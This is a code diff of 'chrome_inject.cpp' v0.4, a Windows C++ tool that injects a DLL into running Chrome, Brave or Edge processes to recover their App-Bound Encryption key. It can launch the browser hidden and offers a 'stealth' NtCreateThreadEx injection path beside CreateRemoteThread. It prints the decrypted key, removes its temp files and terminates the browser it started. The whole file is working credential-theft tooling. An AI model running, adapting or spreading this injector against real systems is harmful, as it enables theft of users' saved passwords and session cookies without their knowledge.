@@ -1,3 +1,6 @@
+// chrome_inject.cpp
+// v0.4 (c) Alexander 'xaitax' Hagenah
+
 #include <Windows.h>
 #include <tlhelp32.h>
 #include <fstream>
@@ -5,316 +8,435 @@
 #include <string>
 #include <vector>
 #include <iomanip>
-#include <cctype>
+#include <filesystem>
 
-void SetConsoleColor(WORD color) {
-    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-    SetConsoleTextAttribute(hConsole, color);
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "version.lib")
+
+typedef LONG NTSTATUS;
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+std::string WStringToUtf8(const std::wstring &w)
+{
+    int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    std::string s(sz, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
+    if (!s.empty() && s.back() == '\0')
+        s.pop_back();
+    return s;
 }
 
-void DisplayBanner() {
-    SetConsoleColor(12);
-    std::cout << "------------------------------------------------" << std::endl;
-    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
-    std::cout << "|  CreateRemoteThread + LoadLibrary Injection  |" << std::endl;
-    std::cout << "|  v0.3 by @xaitax                             |" << std::endl;
-    std::cout << "------------------------------------------------" << std::endl;
-    std::cout << "" << std::endl;
-    SetConsoleColor(7);
+static bool verbose = false;
+
+inline void debug(const std::string &msg)
+{
+    if (!verbose)
+        return;
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+    std::cout << "[#] " << msg << std::endl;
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
 }
 
-void CleanupPreviousRun() {
-    char tempPath[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tempPath)) {
-        std::string logFile = std::string(tempPath) + "chrome_decrypt.log";
-        std::string keyFile = std::string(tempPath) + "chrome_appbound_key.txt";
-        DeleteFileA(logFile.c_str());
-        DeleteFileA(keyFile.c_str());
+struct HandleGuard
+{
+    HANDLE h_;
+    explicit HandleGuard(HANDLE h = nullptr) : h_(h) { debug("HandleGuard: acquired handle " + std::to_string((uintptr_t)h)); }
+    ~HandleGuard()
+    {
+        if (h_ && h_ != INVALID_HANDLE_VALUE)
+        {
+            debug("HandleGuard: closing handle " + std::to_string((uintptr_t)h_));
+            CloseHandle(h_);
+        }
+    }
+    HANDLE get() const { return h_; }
+    void reset(HANDLE h = nullptr)
+    {
+        if (h_ && h_ != INVALID_HANDLE_VALUE)
+            CloseHandle(h_);
+        h_ = h;
+        debug("HandleGuard: reset handle to " + std::to_string((uintptr_t)h_));
+    }
+};
+
+void print_status(const std::string &tag, const std::string &msg)
+{
+    WORD col = 7;
+    if (tag == "[+]")
+        col = 10;
+    else if (tag == "[-]")
+        col = 12;
+    else if (tag == "[*]")
+        col = 9;
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), col);
+    std::cout << tag;
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+    std::cout << " " << msg << std::endl;
+}
+
+void DisplayBanner()
+{
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
+    std::cout << "------------------------------------------------" << std::endl;
+    std::cout << "|  Chrome App-Bound Encryption Injector        |" << std::endl;
+    std::cout << "|  Multi-Method Process Injector               |" << std::endl;
+    std::cout << "|  v0.4 by @xaitax                             |" << std::endl;
+    std::cout << "------------------------------------------------" << std::endl
+              << std::endl;
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+}
+
+void CleanupPreviousRun()
+{
+    debug("CleanupPreviousRun: removing temp files");
+    char tmp[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tmp))
+    {
+        std::string logf = std::string(tmp) + "chrome_decrypt.log";
+        std::string keyf = std::string(tmp) + "chrome_appbound_key.txt";
+        debug("Deleting " + logf);
+        DeleteFileA(logf.c_str());
+        debug("Deleting " + keyf);
+        DeleteFileA(keyf.c_str());
     }
 }
 
-std::string WideToUtf8(const std::wstring& wstr) {
-    if (wstr.empty()) return {};
-    
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
-    if (size_needed <= 0) return {};
-    
-    std::string result(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), &result[0], size_needed, nullptr, nullptr);
-    return result;
-}
-
-DWORD GetProcessIdByName(const std::wstring& processName) {
+DWORD GetProcessIdByName(const std::wstring &procName)
+{
+    debug("GetProcessIdByName: snapshotting processes");
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-
-    PROCESSENTRY32W entry = {};
+    if (snap == INVALID_HANDLE_VALUE)
+    {
+        debug("GetProcessIdByName: snapshot failed");
+        return 0;
+    }
+    PROCESSENTRY32W entry{};
     entry.dwSize = sizeof(entry);
-    if (Process32FirstW(snap, &entry)) {
-        do {
-            if (processName == entry.szExeFile) {
-                CloseHandle(snap);
-                return entry.th32ProcessID;
+    DWORD pid = 0;
+    if (Process32FirstW(snap, &entry))
+    {
+        do
+        {
+            if (procName == entry.szExeFile)
+            {
+                pid = entry.th32ProcessID;
+                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(pid));
+                break;
             }
         } while (Process32NextW(snap, &entry));
     }
     CloseHandle(snap);
-    return 0;
+    return pid;
 }
 
-std::string GetDllPath() {
-    char path[MAX_PATH];
-    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
-        char drive[_MAX_DRIVE];
-        char dir[_MAX_DIR];
-        char fname[_MAX_FNAME];
-        char ext[_MAX_EXT];
-        _splitpath_s(path, drive, _MAX_DRIVE, dir, _MAX_DIR, fname, _MAX_FNAME, ext, _MAX_EXT);
-        std::string dllPath = std::string(drive) + std::string(dir) + "chrome_decrypt.dll";
-        return dllPath;
-    }
-    return "";
+std::string GetDllPath()
+{
+    namespace fs = std::filesystem;
+    auto path = fs::current_path() / "chrome_decrypt.dll";
+    debug("GetDllPath: " + path.string());
+    return path.string();
 }
 
-bool InjectDll(DWORD pid, const std::string& dllPath) {
-    HANDLE proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-                             PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-    if (!proc) return false;
-
-    LPVOID remote = VirtualAllocEx(proc, nullptr, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remote) {
-        CloseHandle(proc);
+bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPath)
+{
+    debug("InjectWithLoadLibrary: begin");
+    SIZE_T size = dllPath.size() + 1;
+    debug("VirtualAllocEx size=" + std::to_string(size));
+    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!rem)
+    {
+        debug("VirtualAllocEx failed");
         return false;
     }
-
-    if (!WriteProcessMemory(proc, remote, dllPath.c_str(), dllPath.size() + 1, nullptr)) {
-        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-        CloseHandle(proc);
+    debug("WriteProcessMemory of DLL path");
+    if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
+    {
+        debug("WriteProcessMemory failed");
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-
     auto loader = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
-    if (!loader) {
-        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-        CloseHandle(proc);
+    debug(std::string("LoadLibraryA at ") + std::to_string((uintptr_t)loader));
+    if (!loader)
+    {
+        debug("GetProcAddress failed");
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-
-    HANDLE thread = CreateRemoteThread(proc, nullptr, 0, loader, remote, 0, nullptr);
-    if (!thread) {
-        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-        CloseHandle(proc);
+    debug("Calling CreateRemoteThread");
+    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, loader, rem, 0, nullptr));
+    if (!th.get())
+    {
+        debug("CreateRemoteThread failed");
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-
-    WaitForSingleObject(thread, INFINITE);
-    CloseHandle(thread);
-    VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
-    CloseHandle(proc);
+    WaitForSingleObject(th.get(), INFINITE);
+    debug("Remote thread finished");
+    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+    debug("InjectWithLoadLibrary: done");
     return true;
 }
 
-std::string GetTempFilePath() {
-    char tempPath[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tempPath)) {
-        return std::string(tempPath) + "chrome_appbound_key.txt";
+using pNtCreateThreadEx = NTSTATUS(NTAPI *)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID);
+bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPath)
+{
+    debug("InjectWithNtCreateThreadEx: begin");
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    debug(std::string("ntdll.dll base=") + std::to_string((uintptr_t)ntdll));
+    auto fn = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+    debug(std::string("NtCreateThreadEx addr=") + std::to_string((uintptr_t)fn));
+    if (!fn)
+    {
+        debug("GetProcAddress NtCreateThreadEx failed");
+        return false;
     }
-    return "";
+    SIZE_T size = dllPath.size() + 1;
+    debug("VirtualAllocEx size=" + std::to_string(size));
+    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!rem)
+    {
+        debug("VirtualAllocEx failed");
+        return false;
+    }
+    WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr);
+    debug("WriteProcessMemory complete");
+    debug("Calling NtCreateThreadEx");
+    HANDLE thr = nullptr;
+    NTSTATUS st = fn(&thr, THREAD_ALL_ACCESS, nullptr, proc,
+                     GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA"), rem,
+                     FALSE, 0, 0, 0, nullptr);
+    debug(std::string("NtCreateThreadEx returned ") + std::to_string(st) + std::string(", thr=") + std::to_string((uintptr_t)thr));
+    if (!NT_SUCCESS(st) || !thr)
+    {
+        debug("NtCreateThreadEx failed");
+        if (thr)
+            CloseHandle(thr);
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+        return false;
+    }
+    WaitForSingleObject(thr, INFINITE);
+    CloseHandle(thr);
+    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+    debug("InjectWithNtCreateThreadEx: done");
+    return true;
 }
 
-std::string ReadKeyFromFile() {
-    std::string tempFile = GetTempFilePath();
-    if (!tempFile.empty()) {
-        std::ifstream ifs(tempFile);
-        if (ifs) {
-            std::string key;
-            std::getline(ifs, key);
-            return key;
-        }
+bool StartBrowserAndWait(const std::wstring &exe, DWORD &outPid)
+{
+    std::string cmd = WStringToUtf8(exe);
+    debug("StartBrowserAndWait: exe=" + cmd);
+    STARTUPINFOW si{};
+    PROCESS_INFORMATION pi{};
+    si.cb = sizeof(si);
+    if (!CreateProcessW(exe.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+    {
+        debug("CreateProcessW failed");
+        return false;
     }
-    return "";
+    CloseHandle(pi.hThread);
+    Sleep(2000);
+    outPid = pi.dwProcessId;
+    CloseHandle(pi.hProcess);
+    debug("Browser started PID=" + std::to_string(outPid));
+    return true;
 }
 
-void PrintChromeVersion(const std::wstring& chromePath) {
-    DWORD handle = 0;
-    DWORD versionSize = GetFileVersionInfoSizeW(chromePath.c_str(), &handle);
-    if (versionSize == 0) return;
-
-    std::vector<char> versionData(versionSize);
-    if (!GetFileVersionInfoW(chromePath.c_str(), handle, versionSize, versionData.data())) return;
-
-    VS_FIXEDFILEINFO* fileInfo = nullptr;
-    UINT size = 0;
-    if (!VerQueryValueW(versionData.data(), L"\\", (LPVOID*)&fileInfo, &size)) return;
-
-    if (fileInfo) {
-        DWORD major = HIWORD(fileInfo->dwFileVersionMS);
-        DWORD minor = LOWORD(fileInfo->dwFileVersionMS);
-        DWORD build = HIWORD(fileInfo->dwFileVersionLS);
-        DWORD revision = LOWORD(fileInfo->dwFileVersionLS);
-
-        std::string browserName;
-        if (chromePath.find(L"Brave") != std::wstring::npos) {
-            browserName = "Brave";
-        }
-        else if (chromePath.find(L"Edge") != std::wstring::npos) {
-            browserName = "Edge";
-        }
-        else {
-            browserName = "Chrome";
-        }
-
-        SetConsoleColor(10);
-        std::cout << "[+] ";
-        SetConsoleColor(7);
-        std::cout << browserName << " Version: " << major << "." << minor << "." << build << "." << revision << std::endl;
-    }
-}
-
-void DisplayLog() {
-    char tempPath[MAX_PATH];
-
-    if (!GetTempPathA(MAX_PATH, tempPath))
-        return;
-
-    std::string logFile = std::string(tempPath) + "chrome_decrypt.log";
-    std::ifstream file(logFile);
-    if (!file)
-        return;
-
-    const WORD DEFAULT_COLOUR = 7;
-
-    std::string line;
-    while (std::getline(file, line)) {
-        if (line.empty())
-            continue;
-        size_t pos = 0;
-        while (pos < line.size()) {
-            size_t brOpen = line.find('[', pos);
-
-            SetConsoleColor(DEFAULT_COLOUR);
-            std::cout << line.substr(pos, brOpen == std::string::npos ? std::string::npos
-                                                                     : brOpen - pos);
-
-            if (brOpen == std::string::npos)
-                break;
-
-            size_t brClose = line.find(']', brOpen);
-            if (brClose == std::string::npos) {
-                break;
-            }
-
-            std::string token = line.substr(brOpen, brClose - brOpen + 1);
-
-            if (token == "[+]")          SetConsoleColor(10);
-            else if (token == "[-]")     SetConsoleColor(12);
-            else if (token == "[*]")     SetConsoleColor(9);
-            else                         SetConsoleColor(DEFAULT_COLOUR);
-
-            std::cout << token;
-
-            pos = brClose + 1;
-        }
-        std::cout << std::endl;
-    }
-
-    file.close();
-    DeleteFileA(logFile.c_str());
-}
-
-int main(int argc, char* argv[]) {
+int wmain(int argc, wchar_t *argv[])
+{
     DisplayBanner();
-    if (argc < 2) {
-        SetConsoleColor(12);
-        std::cerr << "Usage: " << argv[0] << " <browserType: chrome|brave|edge>" << std::endl;
-        SetConsoleColor(7);
+    std::string method = "load";
+    bool autostart = false, started = false;
+    std::wstring browser;
+    debug("wmain: parsing arguments");
+    for (int i = 1; i < argc; ++i)
+    {
+        std::wstring a = argv[i];
+        debug(std::string("arg[") + std::to_string(i) + "]=" + WStringToUtf8(a));
+        if (a == L"--method" && i + 1 < argc)
+        {
+            method = WStringToUtf8(argv[++i]);
+            debug("method=" + method);
+        }
+        else if (a == L"--start-browser")
+        {
+            autostart = true;
+            debug("autostart=true");
+        }
+        else if (a == L"--verbose")
+        {
+            verbose = true;
+            debug("verbose=true");
+        }
+        else if (browser.empty())
+        {
+            browser = a;
+            debug("browser=" + WStringToUtf8(browser));
+        }
+    }
+    if (browser.empty())
+    {
+        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
+        std::wcout << L"Usage:\n"
+                   << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
+                   << L"Options:\n"
+                   << L"  --method load|nt    Injection method\n"
+                   << L"  --start-browser     Auto-launch browser\n"
+                   << L"  --verbose           Enable verbose debug output\n";
+        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
         return 1;
     }
-
     CleanupPreviousRun();
-
-    std::string browserType = argv[1];
-    std::wstring processName;
-    std::wstring executablePath;
-    std::string browserDisplay = browserType;
-    browserDisplay[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplay[0])));
-
-    if (browserType == "chrome") {
-        processName = L"chrome.exe";
-        executablePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+    std::string disp = WStringToUtf8(browser);
+    if (!disp.empty())
+        disp[0] = toupper((unsigned char)disp[0]);
+    debug("Target display name=" + disp);
+    std::wstring procName, exePath;
+    if (browser == L"chrome")
+    {
+        procName = L"chrome.exe";
+        exePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
     }
-    else if (browserType == "brave") {
-        processName = L"brave.exe";
-        executablePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+    else if (browser == L"brave")
+    {
+        procName = L"brave.exe";
+        exePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
     }
-    else if (browserType == "edge") {
-        processName = L"msedge.exe";
-        executablePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+    else if (browser == L"edge")
+    {
+        procName = L"msedge.exe";
+        exePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
     }
-    else {
-        SetConsoleColor(12);
-        std::cerr << "[-] Unsupported browser type" << std::endl;
-        SetConsoleColor(7);
+    else
+    {
+        print_status("[-]", "Unsupported browser type");
         return 1;
     }
-
-    DWORD pid = GetProcessIdByName(processName);
-    if (!pid) {
-        SetConsoleColor(12);
-        std::cerr << "[-] " << browserType << " not running" << std::endl;
-        SetConsoleColor(7);
+    debug("procName=" + WStringToUtf8(procName) + ", exePath=" + WStringToUtf8(exePath));
+    DWORD pid = GetProcessIdByName(procName);
+    if (!pid && autostart)
+    {
+        print_status("[*]", disp + " not running, launching...");
+        if (StartBrowserAndWait(exePath, pid))
+        {
+            started = true;
+            print_status("[+]", disp + " launched (PID=" + std::to_string(pid) + ")");
+        }
+        else
+        {
+            print_status("[-]", "Failed to start " + disp);
+            return 1;
+        }
+    }
+    if (!pid)
+    {
+        print_status("[-]", disp + " not running");
         return 1;
     }
+    debug("Retrieving version info");
+    DWORD hv = 0, vs = GetFileVersionInfoSizeW(exePath.c_str(), &hv);
+    debug("GetFileVersionInfoSizeW returned size=" + std::to_string(vs));
+    if (vs)
+    {
+        std::vector<BYTE> data(vs);
+        if (GetFileVersionInfoW(exePath.c_str(), hv, vs, data.data()))
+        {
+            UINT len = 0;
+            VS_FIXEDFILEINFO *ffi = nullptr;
+            if (VerQueryValueW(data.data(), L"\\", (LPVOID *)&ffi, &len))
+            {
+                std::string ver = std::to_string(HIWORD(ffi->dwFileVersionMS)) + "." +
+                                  std::to_string(LOWORD(ffi->dwFileVersionMS)) + "." +
+                                  std::to_string(HIWORD(ffi->dwFileVersionLS)) + "." +
+                                  std::to_string(LOWORD(ffi->dwFileVersionLS));
+                print_status("[+]", disp + " Version: " + ver);
+                debug("Version string=" + ver);
+            }
+        }
+    }
+    std::string mdesc = (method == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibrary";
+    print_status("[*]", "Located " + disp + " with PID " + std::to_string(pid));
 
-    SetConsoleColor(9);
-    std::cout << "[*] ";
-    SetConsoleColor(7);
-    std::cout << "Located " << browserDisplay << " with PID " << pid << std::endl;
-
-    PrintChromeVersion(executablePath);
-
+    debug("Opening process PID=" + std::to_string(pid));
+    HandleGuard ph(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid));
+    if (!ph.get())
+    {
+        print_status("[-]", "OpenProcess failed");
+        return 1;
+    }
     std::string dllPath = GetDllPath();
-    if (dllPath.empty()) {
-        SetConsoleColor(12);
-        std::cerr << "[-] Could not locate chrome_decrypt.dll" << std::endl;
-        SetConsoleColor(7);
+    if (dllPath.empty())
+    {
+        print_status("[-]", "chrome_decrypt.dll not found");
         return 1;
     }
-
-    if (!InjectDll(pid, dllPath)) {
-        SetConsoleColor(12);
-        std::cerr << "[-] DLL injection failed" << std::endl;
-        SetConsoleColor(7);
+    bool injected = (method == "nt") ? InjectWithNtCreateThreadEx(ph.get(), dllPath) : InjectWithLoadLibrary(ph.get(), dllPath);
+    print_status(injected ? "[+]" : "[-]", injected ? "DLL injected via " + mdesc : "DLL injection failed");
+    if (!injected)
         return 1;
-    }
-
-    SetConsoleColor(10);
-    std::cout << "[+] ";
-    SetConsoleColor(7);
-    std::cout << "DLL injected." << std::endl;
-
-    SetConsoleColor(9);
-    std::cout << "[*] ";
-    SetConsoleColor(7);
-    std::cout << "Starting Chrome App-Bound Encryption Decryption process." << std::endl;
-
+    print_status("[*]", "Starting Chrome App-Bound Encryption Decryption process.");
     Sleep(1000);
-
-    DisplayLog();
-
-    std::string key = ReadKeyFromFile();
-    if (!key.empty()) {
-        std::cout << std::endl;
-        SetConsoleColor(10);
-        std::cout << "[+] Decrypted Key: " << key << std::endl;
-        SetConsoleColor(7);
+    char tmpPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tmpPath))
+    {
+        std::string logf = std::string(tmpPath) + "chrome_decrypt.log";
+        debug("Opening log file " + logf);
+        std::ifstream ifs(logf);
+        std::string ln;
+        const WORD DEF = 7;
+        while (std::getline(ifs, ln))
+        {
+            size_t p = 0;
+            while (p < ln.size())
+            {
+                size_t o = ln.find('[', p);
+                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), DEF);
+                std::cout << ln.substr(p, (o == std::string::npos) ? std::string::npos : o - p);
+                if (o == std::string::npos)
+                    break;
+                size_t c = ln.find(']', o);
+                std::string tok = ln.substr(o, (c == std::string::npos) ? 1 : c - o + 1);
+                if (tok == "[+]")
+                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
+                else if (tok == "[-]")
+                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
+                else if (tok == "[*]")
+                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
+                std::cout << tok;
+                p = (c == std::string::npos) ? ln.size() : c + 1;
+            }
+            std::cout << std::endl;
+        }
+        DeleteFileA(logf.c_str());
+        std::string keyf = std::string(tmpPath) + "chrome_appbound_key.txt";
+        debug("Opening key file " + keyf);
+        std::ifstream kfs(keyf);
+        if (kfs)
+        {
+            std::string key;
+            std::getline(kfs, key);
+            print_status("[+]", "Decrypted Key: " + key);
+            debug("Key: " + key);
+        }
+        else
+        {
+            print_status("[-]", "Key file missing");
+            return 1;
+        }
+        if (started)
+        {
+            debug("Terminating browser PID=" + std::to_string(pid));
+            HandleGuard kh(OpenProcess(PROCESS_TERMINATE, FALSE, pid));
+            if (kh.get())
+            {
+                TerminateProcess(kh.get(), 0);
+                print_status("[*]", disp + " terminated");
+            }
+        }
     }
-    else {
-        SetConsoleColor(12);
-        std::cerr << "[-] Could not retrieve decrypted key" << std::endl;
-        SetConsoleColor(7);
-        return 1;
-    }
-
+    debug("Exiting, success");
     return 0;
 }
